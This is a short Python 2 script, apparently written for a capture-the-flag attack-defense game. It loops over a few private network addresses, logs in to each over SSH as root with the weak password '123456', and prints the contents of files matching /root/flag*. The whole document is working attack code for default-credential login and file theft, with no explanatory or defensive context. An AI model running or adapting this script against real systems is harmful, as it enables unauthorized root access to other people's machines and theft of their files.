import paramiko
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
for i in range(164,168):
    try:
        host = '192.168.112.'+str(i)
        ssh.connect(hostname=host,port=22,username='root',password='123456')
        stdin,stdout,stderr=ssh.exec_command('cat /root/flag*')
        print host
        print stdout.read()
        print stderr.read()
        ssh.close()
    except:
        print host+'\ngg'
